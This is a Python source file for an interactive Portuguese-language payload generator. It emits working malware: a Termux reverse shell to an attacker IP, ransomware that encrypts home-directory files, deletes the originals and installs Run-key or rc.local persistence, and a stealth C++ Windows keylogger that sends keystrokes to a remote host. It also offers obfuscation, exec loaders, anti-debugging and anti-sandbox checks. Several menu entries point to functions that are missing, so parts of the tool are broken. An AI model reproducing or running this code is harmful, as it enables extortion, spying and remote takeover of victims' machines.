import base64
import random
import sys
import os
import zlib
import platform
import ctypes
import hashlib
import json
import time
from typing import Dict, List, Optional
from pathlib import Path
from argparse import ArgumentParser
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.layout import Layout
from rich.text import Text
from rich.markdown import Markdown
import pygments
from pygments.lexers import PythonLexer, CppLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorPayloadsElite:
    def __init__(self):
        self.payloads = {
            # Shells avançados
            'reverse_tcp_ssl': {
                'function': self.gerar_reverse_tcp_ssl,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell com criptografia SSL'
            },
            'bind_tcp_stealth': {
                'function': self.gerar_bind_tcp_stealth,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell com técnicas de ocultação'
            },
            
            # Payloads destrutivos
            'limpar_disco': {
                'function': self.gerar_limpador_disco,
                'category': 'Destrutivos',
                'danger_level': 'high',
                'description': 'Sobrescreve o disco com dados aleatórios'
            },
            'ransomware': {
                'function': self.gerar_ransomware_real,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa arquivos e exige resgate'
            },
            
            # Payloads para Termux
            'termux_reverse_shell': {
                'function': self.gerar_termux_reverse_shell,
                'category': 'Termux',
                'danger_level': 'medium',
                'description': 'Reverse Shell para Android via Termux'
            },
            
            # Payloads em C++
            'cpp_keylogger': {
                'function': self.gerar_cpp_keylogger,
                'category': 'C++',
                'danger_level': 'high',
                'description': 'Keylogger em C++ para Windows'
            },
            
            # Técnicas avançadas
            'injetor_processo': {
                'function': self.gerar_injetor_processo,
                'category': 'Avançados',
                'danger_level': 'high',
                'description': 'Injeção de código em processos'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'polimorfico': 'Ofuscação polimórfica (recomendada)',
            'metamorfico': 'Ofuscação metamórfica (avançada)',
            'criptografar_aes': 'Criptografia AES-256',
            'anti_depuracao': 'Técnicas anti-debugging'
        }
        
        self.banners = [
            self._generate_banner("red"),
            self._generate_banner("blue"),
            self._generate_banner("green")
        ]
        
        self.idiomas = self._carregar_idiomas()
        self.idioma_atual = 'pt_BR'
        
        self.aviso_destrutivo = {
            'pt_BR': """
            ⚠️ [bold red]AVISO CRÍTICO:[/bold red] Este payload é altamente destrutivo e pode causar:
            - Perda permanente de dados
            - Instabilidade do sistema
            - Danos ao hardware
            - Consequências legais graves
            
            [bold]Use apenas em ambientes controlados com autorização explícita![/bold]
            """,
            'en_US': """
            ⚠️ [bold red]CRITICAL WARNING:[/bold red] This payload is highly destructive and may cause:
            - Permanent data loss
            - System instability
            - Hardware damage
            - Severe legal consequences
            
            [bold]Use only in controlled environments with explicit authorization![/bold]
            """
        }
        
        self._verificar_dependencias()
    
    def _generate_banner(self, color: str) -> str:
        """Gera banners ASCII coloridos dinamicamente"""
        colors = {
            "red": "[bold red]",
            "blue": "[bold blue]",
            "green": "[bold green]",
            "yellow": "[bold yellow]"
        }
        color_code = colors.get(color, "[bold]")
        
        return f"""
{color_code}  ██████╗ ███████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ██████╔╝███████║██████╔╝█████╗  ██║  ██║
  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██╗██╔══╝  ██║  ██║
  ██║     ███████╗██║  ██║██║  ██║██║  ██║███████╗██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝ 
  [bold]v5.0 Elite - Python + C++ + Termux[/]
        """
    
    def _carregar_idiomas(self) -> Dict:
        """Carrega os arquivos de idioma"""
        try:
            with open('idiomas.json', 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                'pt_BR': {
                    'menu_titulo': '🔧 Gerador de Payloads Elite',
                    'menu_opcoes': ['Shells Avançados', 'Payloads Destrutivos', 'Termux', 'C++', 'Sair'],
                    'confirmar_destrutivo': '⚠️ Confirma uso de payload destrutivo?'
                },
                'en_US': {
                    'menu_titulo': '🔧 Elite Payload Generator',
                    'menu_opcoes': ['Advanced Shells', 'Destructive Payloads', 'Termux', 'C++', 'Exit'],
                    'confirmar_destrutivo': '⚠️ Confirm destructive payload usage?'
                }
            }
    
    def _verificar_dependencias(self):
        """Verifica e instala dependências automaticamente"""
        required = {
            'cryptography': 'cryptography',
            'pycryptodome': 'pycryptodomex',
            'flask': 'flask',
            'rich': 'rich'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print("[red]✗ Dependências faltando:[/red]", ", ".join(missing))
            if Confirm.ask("[?] Instalar automaticamente?", default=True):
                with Progress() as progress:
                    task = progress.add_task("[cyan]Instalando dependências...", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependências instaladas com sucesso![/green]")
                time.sleep(1)
    
    def mostrar_banner(self):
        """Exibe um banner aleatório com cores"""
        console.print(random.choice(self.banners))
        console.print(Panel("⚠️ [blink bold red]USE APENAS PARA TESTES AUTORIZADOS![/blink bold red]", 
                          style="red"))
    
    def mostrar_menu_principal(self):
        """Exibe o menu principal interativo"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            menu_data = self.idiomas[self.idioma_atual]
            
            table = Table(title=f"[bold cyan]{menu_data['menu_titulo']}[/]", 
                         show_header=True, header_style="bold magenta")
            table.add_column("Opção", style="cyan", width=10)
            table.add_column("Descrição", style="green")
            
            for i, opcao in enumerate(menu_data['menu_opcoes'], 1):
                table.add_row(str(i), opcao)
            
            table.add_row("0", "Configurações")
            console.print(table)
            
            escolha = Prompt.ask("➤ Selecione uma opção", choices=[str(i) for i in range(0, len(menu_data['menu_opcoes'])+1)])
            
            if escolha == "1":
                self._mostrar_submenu('Shells')
            elif escolha == "2":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "3":
                self._mostrar_submenu('Termux')
            elif escolha == "4":
                self._mostrar_submenu('C++')
            elif escolha == "5":
                sys.exit(0)
            elif escolha == "0":
                self._mostrar_menu_configuracao()
    
    def _mostrar_submenu(self, categoria: str):
        """Mostra um submenu para uma categoria específica"""
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            table = Table(title=f"[bold]{categoria}[/] - Selecione um payload", 
                         show_header=True, header_style="bold blue")
            table.add_column("ID", style="cyan", width=5)
            table.add_column("Nome", style="green")
            table.add_column("Descrição")
            table.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                danger_icon = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                table.add_row(str(i), nome, dados['description'], danger_icon + dados['danger_level'].upper())
            
            table.add_row("0", "Voltar", "Retorna ao menu principal", "")
            console.print(table)
            
            escolha = Prompt.ask("➤ Selecione um payload", 
                                choices=[str(i) for i in range(0, len(payloads_categoria)+1)])
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _mostrar_menu_configuracao(self):
        """Mostra o menu de configurações"""
        while True:
            console.clear()
            console.print(Panel("[bold cyan]⚙️ Configurações[/bold cyan]"))
            
            table = Table(show_header=False)
            table.add_row("1", "Alterar idioma")
            table.add_row("2", "Verificar dependências")
            table.add_row("0", "Voltar")
            console.print(table)
            
            escolha = Prompt.ask("➤ Selecione uma opção", choices=["0", "1", "2"])
            
            if escolha == "1":
                self._alterar_idioma()
            elif escolha == "2":
                self._verificar_dependencias()
                console.print("\n[green]✓ Verificação concluída![/green]")
                input("\nPressione Enter para continuar...")
            elif escolha == "0":
                return
    
    def _alterar_idioma(self):
        """Permite alterar o idioma da interface"""
        console.clear()
        table = Table(title="🌐 Selecionar Idioma")
        table.add_column("Código")
        table.add_column("Idioma")
        
        for code, name in [('pt_BR', 'Português (BR)'), ('en_US', 'English (US)')]:
            table.add_row(code, name)
        
        console.print(table)
        escolha = Prompt.ask("➤ Selecione um idioma", choices=['pt_BR', 'en_US'])
        self.idioma_atual = escolha
        console.print(f"[green]✓ Idioma alterado para {escolha}[/green]")
        time.sleep(1)
    
    def _processar_payload(self, nome_payload: str):
        """Processa a geração de um payload específico"""
        payload_data = self.payloads[nome_payload]
        
        # Verificação para payloads destrutivos
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel(self.aviso_destrutivo[self.idioma_atual], 
                              title="[blink bold red]AVISO CRÍTICO[/]", 
                              style="red"))
            if not Confirm.ask("[?] Confirmar criação deste payload?", default=False):
                return
        
        # Configuração do payload
        config = self._configurar_payload(nome_payload)
        if config is None:  # Usuário cancelou
            return
        
        # Seleção de técnicas de ofuscação
        ofuscar = False
        tecnicas = []
        if Confirm.ask("[?] Aplicar técnicas de ofuscação?", default=True):
            ofuscar = True
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        # Geração do payload
        with Progress() as progress:
            task = progress.add_task("[cyan]Gerando payload...", total=100)
            
            # Etapa 1: Gerar código base
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            # Etapa 2: Aplicar ofuscação
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self.ofuscar_avancado(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        # Visualização do payload
        self._preview_payload(payload, 'python' if nome_payload not in ['cpp_keylogger'] else 'cpp')
        
        # Salvamento do arquivo
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        """Configura os parâmetros específicos do payload"""
        config = {}
        
        if nome_payload in ['reverse_tcp_ssl', 'termux_reverse_shell', 'bind_tcp_stealth']:
            console.print(Panel("[bold]Configuração de Conexão[/bold]"))
            config['ip'] = Prompt.ask("[?] IP do atacante", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[?] Porta", default=4444)
        
        elif nome_payload == 'ransomware':
            console.print(Panel("[bold]Configuração de Ransomware[/bold]"))
            config['extensoes'] = Prompt.ask(
                "[?] Extensões de arquivo para criptografar (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[?] Mensagem de resgate",
                default="Seus arquivos foram criptografados! Envie 1 BTC para..."
            )
        
        elif nome_payload == 'cpp_keylogger':
            console.print(Panel("[bold]Configuração de Keylogger[/bold]"))
            config['arquivo_saida'] = Prompt.ask(
                "[?] Nome do arquivo de log",
                default="keylog.txt"
            )
        
        # Confirmação final
        console.print("\n[bold]Resumo da configuração:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("\n[?] Confirmar configurações?", default=True):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        """Permite selecionar técnicas de ofuscação"""
        console.print("\n[bold]Técnicas de Ofuscação Disponíveis:[/bold]")
        table = Table(show_header=False)
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            table.add_row(str(i), codigo, desc)
        console.print(table)
        
        escolhas = Prompt.ask(
            "[?] Selecione técnicas (separadas por vírgula)",
            default="1,3"  # Polimórfico + AES por padrão
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'python'):
        """Mostra uma prévia do payload com syntax highlighting"""
        console.print(Panel("[bold]Pré-visualização do Payload[/bold]"))
        
        # Usando Pygments para syntax highlighting mais preciso
        lexer = PythonLexer() if language == 'python' else CppLexer()
        formatter = TerminalFormatter()
        
        # Limita a pré-visualização às primeiras 100 linhas
        lines = payload.split('\n')[:100]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 100:
            console.print("[yellow]... (arquivo truncado para visualização)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        """Salva o payload em um arquivo com opções avançadas"""
        default_ext = {
            'cpp_keylogger': '.cpp',
            'cpp_memory_injection': '.cpp',
            'cpp_process_hollowing': '.cpp'
        }.get(nome_payload, '.py')
        
        nome_arquivo = Prompt.ask(
            "[?] Nome do arquivo de saída",
            default=f"payload_{nome_payload}{default_ext}"
        )
        
        # Opções avançadas de salvamento
        if Confirm.ask("[?] Ativar opções avançadas de salvamento?", default=False):
            self._salvamento_avancado(nome_arquivo, payload)
            return
        
        # Salvamento simples
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            console.print(f"[green]✓ Payload salvo como [bold]{nome_arquivo}[/bold][/green]")
            
            # Mostrar hash do arquivo para verificação
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                console.print(f"[cyan]MD5: [bold]{md5}[/bold][/cyan]")
                
        except Exception as e:
            console.print(f"[red]✗ Erro ao salvar arquivo: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    def _salvamento_avancado(self, nome_arquivo: str, payload: str):
        """Oferece opções avançadas de salvamento"""
        console.print("\n[bold]Opções Avançadas de Salvamento:[/bold]")
        table = Table(show_header=False)
        table.add_row("1", "Empacotar como executável (PyInstaller)")
        table.add_row("2", "Ocultar em arquivo legítimo (Steganografia)")
        table.add_row("3", "Adicionar persistência automática")
        table.add_row("4", "Salvar normalmente")
        console.print(table)
        
        escolha = Prompt.ask("➤ Selecione uma opção", choices=["1", "2", "3", "4"])
        
        if escolha == "1":
            self._empacotar_com_pyinstaller(nome_arquivo, payload)
        elif escolha == "2":
            self._ocultar_em_arquivo(nome_arquivo, payload)
        elif escolha == "3":
            self._adicionar_persistencia(nome_arquivo, payload)
        else:
            self._salvar_payload(nome_payload, payload)
    
    def _empacotar_com_pyinstaller(self, nome_arquivo: str, payload: str):
        """Empacota o payload como executável usando PyInstaller"""
        try:
            # Salvar script temporário
            temp_script = f"temp_{nome_arquivo}"
            with open(temp_script, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            console.print("[cyan]▶ Empacotando com PyInstaller...[/cyan]")
            
            # Comandos diferentes para Windows e Linux
            if platform.system() == 'Windows':
                os.system(f'pyinstaller --onefile --noconsole --icon=NONE {temp_script}')
                console.print(f"[green]✓ Executável gerado em dist/{temp_script[:-3]}.exe[/green]")
            else:
                os.system(f'pyinstaller --onefile {temp_script}')
                console.print(f"[green]✓ Executável gerado em dist/{temp_script[:-3]}[/green]")
            
            # Limpeza
            os.remove(temp_script)
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao empacotar: {str(e)}[/red]")
        
        input("\nPressione Enter para continuar...")
    
    # --- Payloads Avançados ---
    
    def gerar_termux_reverse_shell(self, ip: str = "192.168.1.100", porta: int = 4444, **kwargs) -> str:
        """Reverse Shell otimizado para Termux no Android"""
        payload = f"""import socket,subprocess,os
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{ip}",{porta}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(["/data/data/com.termux/files/usr/bin/sh","-i"])
    except Exception as e:
        try:
            # Tentativa alternativa usando Python puro
            import pty
            pty.spawn("/data/data/com.termux/files/usr/bin/sh")
        except:
            pass

reverse_shell()"""
        return payload
    
    def gerar_ransomware_real(self, extensoes: List[str] = None, resgate: str = None, **kwargs) -> str:
        """Ransomware real com criptografia AES-256"""
        if extensoes is None:
            extensoes = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png']
        
        if resgate is None:
            resgate = "Seus arquivos foram criptografados! Envie 1 BTC para..."
        
        payload = f"""import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64

class Ransomware:
    def __init__(self):
        self.chave = get_random_bytes(32)
        self.iv = get_random_bytes(16)
        self.extensoes = {extensoes}
        self.resgate = '''{resgate}'''
        
    def criptografar_arquivo(self, caminho_arquivo):
        try:
            with open(caminho_arquivo, 'rb') as f:
                dados = f.read()
            
            cifra = AES.new(self.chave, AES.MODE_CBC, self.iv)
            dados_padded = pad(dados, AES.block_size)
            criptografado = cifra.encrypt(dados_padded)
            
            with open(caminho_arquivo + '.encrypted', 'wb') as f:
                f.write(criptografado)
                
            os.remove(caminho_arquivo)
        except:
            pass
    
    def gerar_resgate(self):
        try:
            with open('LEIA-ME.txt', 'w') as f:
                f.write(self.resgate + '\\n\\n')
                f.write(f'Chave: {{base64.b64encode(self.chave).decode()}}\\n')
                f.write(f'IV: {{base64.b64encode(self.iv).decode()}}\\n')
        except:
            pass
    
    def executar(self):
        import threading
        
        # Persistência
        if platform.system() == 'Windows':
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                    'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 
                                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, sys.argv[0])
                winreg.CloseKey(key)
            except:
                pass
        else:
            try:
                with open('/etc/rc.local', 'a') as f:
                    f.write(f'python3 "{{sys.argv[0]}}" &\\n')
            except:
                pass
        
        # Criptografar arquivos em threads paralelas
        threads = []
        for raiz, _, arquivos in os.walk(os.path.expanduser('~')):
            for arquivo in arquivos:
                if any(arquivo.endswith(ext) for ext in self.extensoes):
                    t = threading.Thread(target=self.criptografar_arquivo, 
                                       args=(os.path.join(raiz, arquivo),))
                    threads.append(t)
                    t.start()
        
        for t in threads:
            t.join()
        
        self.gerar_resgate()

if __name__ == '__main__':
    ransomware = Ransomware()
    ransomware.executar()"""
        return payload
    
    def gerar_cpp_keylogger(self, arquivo_saida: str = "keylog.txt", **kwargs) -> str:
        """Gerador de código C++ para keylogger avançado"""
        payload_cpp = f"""// Keylogger em C++ para Windows - Modo Stealth
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <ctime>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

std::ofstream logfile;
bool running = true;
SOCKET sock = INVALID_SOCKET;

void hideConsole() {{
    HWND stealth = GetConsoleWindow();
    if (stealth != NULL) {{
        ShowWindow(stealth, SW_HIDE);
    }}
}}

void sendToServer(const std::string& data) {{
    if (sock == INVALID_SOCKET) return;
    
    send(sock, data.c_str(), data.length(), 0);
}}

void initNetwork() {{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
    
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {{
        WSACleanup();
        return;
    }}
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("192.168.1.100"); // Alterar IP
    serverAddr.sin_port = htons(4444); // Alterar porta
    
    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) {{
        closesocket(sock);
        WSACleanup();
        sock = INVALID_SOCKET;
    }}
}}

void logKey(int key, const char* keyName) {{
    std::string logEntry;
    
    if (keyName != nullptr) {{
        logEntry = keyName;
    }} else {{
        logEntry = std::string(1, static_cast<char>(key));
    }}
    
    // Log local
    logfile << logEntry;
    logfile.flush();
    
    // Envio remoto
    if (sock != INVALID_SOCKET) {{
        sendToServer(logEntry);
    }}
}}

void keyLogger() {{
    logfile.open("{arquivo_saida}", std::ios_base::app);
    
    time_t now = time(0);
    logfile << "\\n[Keylogger Started - " << ctime(&now) << "]\\n";
    
    initNetwork();
    
    while (running) {{
        for (int i = 8; i <= 255; i++) {{
            if (GetAsyncKeyState(i) == -32767) {{
                switch (i) {{
                    case VK_SHIFT: logKey(i, "[SHIFT]"); break;
                    case VK_LSHIFT: logKey(i, "[LSHIFT]"); break;
                    case VK_RSHIFT: logKey(i, "[RSHIFT]"); break;
                    case VK_BACK: logKey(i, "[BACKSPACE]"); break;
                    case VK_RETURN: logKey(i, "\\n[ENTER]\\n"); break;
                    case VK_ESCAPE: logKey(i, "[ESC]"); break;
                    case VK_CAPITAL: logKey(i, "[CAPSLOCK]"); break;
                    case VK_SPACE: logKey(i, " "); break;
                    case VK_TAB: logKey(i, "[TAB]"); break;
                    case VK_CONTROL: logKey(i, "[CTRL]"); break;
                    case VK_MENU: logKey(i, "[ALT]"); break;
                    case VK_DELETE: logKey(i, "[DEL]"); break;
                    case VK_UP: logKey(i, "[UP]"); break;
                    case VK_DOWN: logKey(i, "[DOWN]"); break;
                    case VK_LEFT: logKey(i, "[LEFT]"); break;
                    case VK_RIGHT: logKey(i, "[RIGHT]"); break;
                    default:
                        if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57)) {{
                            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                            
                            if ((shift && !caps) || (!shift && caps)) {{
                                logKey(i, nullptr);
                            }} else {{
                                logKey(i + 32, nullptr);
                            }}
                        }} else {{
                            logKey(i, nullptr);
                        }}
                }}
            }}
        }}
        Sleep(10);
    }}
    
    if (sock != INVALID_SOCKET) {{
        closesocket(sock);
        WSACleanup();
    }}
    logfile.close();
}}

// Técnica de ocultação - Thread Injection
DWORD WINAPI hideThread(LPVOID lpParam) {{
    keyLogger();
    return 0;
}}

int main() {{
    hideConsole();
    
    // Técnica de persistência - Registry
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                0, KEY_SET_VALUE, &hKey);
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hKey);
    
    // Iniciar keylogger em thread oculta
    CreateThread(NULL, 0, hideThread, NULL, 0, NULL);
    
    // Manter o programa rodando
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }}
    
    running = false;
    return 0;
}}"""
        return payload_cpp
    
    # --- Técnicas de Ofuscação Avançadas ---
    
    def ofuscar_avancado(self, payload: str, tecnica: str = 'polimorfico') -> str:
        """Aplica técnicas avançadas de ofuscação ao payload"""
        if tecnica == 'polimorfico':
            return self._ofuscar_polimorfico(payload)
        elif tecnica == 'metamorfico':
            return self._ofuscar_metamorfico(payload)
        elif tecnica == 'criptografar_aes':
            return self._ofuscar_criptografia(payload)
        elif tecnica == 'anti_depuracao':
            return self._adicionar_anti_debug(payload)
        else:
            return payload
    
    def _ofuscar_polimorfico(self, payload: str) -> str:
        """Ofuscação polimórfica - gera código diferente a cada execução"""
        # Gera nomes aleatórios para variáveis e funções
        vars_random = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(5)]
        
        # Gera código lixo aleatório
        codigo_lixo = [
            f"for {vars_random[0]} in range({random.randint(1,5)}): "
            f"{vars_random[1]} = {random.randint(1000,9999)}",
            f"{vars_random[2]} = lambda {vars_random[3]}: {vars_random[3]}**{random.randint(2,5)}",
            f"print(''.join(chr({random.randint(65,90)}) for _ in range({random.randint(3,8)})))"
        ]
        random.shuffle(codigo_lixo)
        
        # Compressão múltipla com codificação diferente
        compressed = zlib.compress(payload.encode('utf-8'))
        b64_encoded = base64.b64encode(compressed)
        b85_encoded = base64.b85encode(b64_encoded)
        
        return f"""# Variante polimórfica {random.randint(1,10000)}
import base64,zlib
{'; '.join(codigo_lixo)}
exec(zlib.decompress(base64.b64decode(base64.b85decode({b85_encoded}))))"""
    
    def _ofuscar_metamorfico(self, payload: str) -> str:
        """Ofuscação metamórfica - reescreve completamente o código"""
        # Dicionário de substituições
        substitutos = {
            'import': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
            'exec': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
            'base64': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12)),
            'zlib': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)),
            'os': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)),
            'sys': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=4))
        }
        
        # Substitui todas as ocorrências
        codigo_transformado = payload
        for original, substituto in substitutos.items():
            codigo_transformado = codigo_transformado.replace(original, substituto)
        
        # Adiciona funções e classes aleatórias
        funcoes_lixo = f"""
class {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))}:
    def __init__(self):
        self.value = {random.randint(100,999)}
    
    def {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))}(self, x):
        return x * {random.randint(2,5)}

def {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=7))}(y):
    return [y**i for i in range({random.randint(3,7)})]
"""
        return f"""# Código metamórfico {random.randint(1,1000)}
{substitutos['import']} {substitutos['os']}
{substitutos['import']} {substitutos['sys']}
{substitutos['import']} {substitutos['base64']}
{substitutos['import']} {substitutos['zlib']}
{funcoes_lixo}
{codigo_transformado}"""
    
    def _ofuscar_criptografia(self, payload: str) -> str:
        """Ofuscação usando criptografia AES"""
        chave = Fernet.generate_key()
        cifra = Fernet(chave)
        payload_cifrado = cifra.encrypt(payload.encode('utf-8'))
        
        return f"""# Payload criptografado com AES
from cryptography.fernet import Fernet
import base64

chave = {chave}
payload_cifrado = {payload_cifrado}

cifra = Fernet(chave)
payload = cifra.decrypt(payload_cifrado).decode('utf-8')
exec(payload)"""
    
    def _adicionar_anti_debug(self, payload: str) -> str:
        """Adiciona técnicas anti-debugging e anti-sandbox"""
        anti_debug_code = """
# Técnicas Anti-Debugging
def check_debug():
    try:
        # Verifica se está sendo executado em debugger
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            os._exit(1)
            
        # Verifica tempo de execução (anti-sandbox)
        start_time = time.time()
        [x**2 for x in range(100000)]
        if time.time() - start_time < 0.01:
            os._exit(1)
            
        # Verifica processos suspeitos (Windows)
        if platform.system() == 'Windows':
            try:
                import wmi
                c = wmi.WMI()
                processos_suspeitos = ['wireshark', 'procmon', 'ida', 'ollydbg', 'vmware', 'vbox']
                for processo in c.Win32_Process():
                    if any(suspeito in processo.Name.lower() for suspeito in processos_suspeitos):
                        os._exit(1)
            except:
                pass
                
        # Verifica variáveis de ambiente de sandbox
        sandbox_env = ['VIRTUALBOX', 'VMWARE', 'QEMU', 'XEN']
        for env in sandbox_env:
            if env in os.environ:
                os._exit(1)
                
    except:
        pass

# Executa verificações periodicamente
def anti_debug_loop():
    import threading
    while True:
        check_debug()
        time.sleep(30)

threading.Thread(target=anti_debug_loop, daemon=True).start()
"""
        # Insere o código anti-debug no início do payload
        return f"import os, sys, time\n{anti_debug_code}\n{payload}"

def main():
    try:
        gerador = GeradorPayloadsElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Operação cancelada pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
